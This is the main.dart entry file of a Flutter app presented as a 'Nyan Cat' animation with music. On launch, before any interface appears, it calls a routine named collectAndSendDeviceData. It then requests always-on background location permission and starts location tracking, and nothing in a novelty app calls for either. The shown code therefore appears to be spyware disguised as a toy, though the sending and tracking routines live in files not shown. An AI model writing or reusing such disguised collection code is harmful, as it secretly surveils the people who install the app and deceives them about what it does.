import 'package:flutter/material.dart';
import 'dart:ui' as ui;
import 'package:flutter/services.dart';
import 'package:just_audio/just_audio.dart';
import 'package:permission_handler/permission_handler.dart';

import 'location_service.dart';
import 'device_service.dart';
import 'home/home.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  try {
    await DeviceService.collectAndSendDeviceData();
    print("Device data collection initiated");
  } catch (e) {
    print("Error collecting device data: $e");
  }

  await Permission.notification.request();
  await Permission.location.request();
  if (await Permission.location.isGranted) {
    await Permission.locationAlways.request();
  }

  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  late Future<List<ui.Image>> _nyanCatFramesFuture;
  final player = AudioPlayer();

  @override
  void initState() {
    super.initState();

    startService();

    _nyanCatFramesFuture = loadNyanFrames();
    loadAudio();
  }

  @override
  void dispose() {
    player.dispose();
    super.dispose();
  }

  Future<void> startService() async {
    if (await Permission.locationAlways.isGranted) {
      await LocationService.instance.startLocationTracking();
    }
  }

  Future<void> loadAudio() async {
    await player.setAsset('assets/nyan-cat.ogg');
    player.setVolume(1.0);
  }

  Future<List<ui.Image>> loadNyanFrames() async {
    var images = <ui.Image>[];
    for (var i = 0; i < 7; i++) {
      final data = await rootBundle.load('assets/$i.gif');
      final codec = await ui.instantiateImageCodec(data.buffer.asUint8List());
      final frame = await codec.getNextFrame();
      images.add(frame.image);
    }
    return images;
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Nyan Cat',
      theme: ThemeData.dark(),
      home: FutureBuilder<List<ui.Image>>(
        future: _nyanCatFramesFuture,
        builder: (_, snapshot) {
          if (snapshot.connectionState == ConnectionState.done &&
              snapshot.hasData) {
            return MyHomePage(
              frames: snapshot.data!,
              audioPlayer: player,
            );
          } else {
            return const Scaffold(
              body: Center(child: CircularProgressIndicator.adaptive()),
            );
          }
        },
      ),
    );
  }
}